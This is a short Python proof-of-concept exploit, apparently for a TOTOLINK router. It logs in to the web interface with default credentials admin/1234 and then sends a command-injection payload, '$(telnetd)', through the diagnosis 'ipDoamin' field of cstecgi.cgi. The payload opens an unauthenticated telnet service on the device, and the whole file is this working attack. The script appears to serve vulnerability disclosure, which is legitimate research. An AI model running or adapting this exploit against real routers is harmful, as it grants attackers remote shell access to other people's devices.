#!/usr/bin/env python
#coding=utf8

import requests, json

USERNAME = 'admin'
PASSWORD = '1234'
inject_cmd = "$(telnetd)"

def toto_login():
    toto_geturl = 'http://192.168.0.1/formLoginAuth.htm?authCode=1&userName='+USERNAME+'&password='+PASSWORD+'&goURL=home.asp&action=login'
    toto_getheaders = {'Host': '192.168.0.1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'http://192.168.0.1/login.asp',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'}

    resp = requests.get(toto_geturl, headers = toto_getheaders, allow_redirects=False)
    cookies = resp.cookies.get_dict()
    for key in cookies.keys():
        cookie = key + '=' + cookies.get(key)
    #print(cookie)
    return cookie

def toto_ping(cookie, cmd):
    ping_data = '{"topicurl":"setting/setDiagnosisCfg","actionFlag":"1","ipDoamin":"www.bai' + cmd + 'du.com"}'
    ping_datalen = str(len(ping_data))
    ping_url = 'http://192.168.0.1/cgi-bin/cstecgi.cgi'
    ping_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0',
            'Accept': '*/*',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Length': ping_datalen,
            'Origin': 'http://192.168.0.1',
            'Connection': 'close',
            'Referer': 'http://192.168.0.1/adm/diagnosis.asp?timestamp=1588226170576'}
    ping_headers['Cookie'] = cookie
    #print(ping_headers)
    resp = requests.post(ping_url, data = ping_data, headers = ping_headers, allow_redirects=False)

if __name__ == "__main__":
    cookie = toto_login()
    print(cookie)

    #Test Diagnosis command injection
    toto_ping(cookie, inject_cmd)

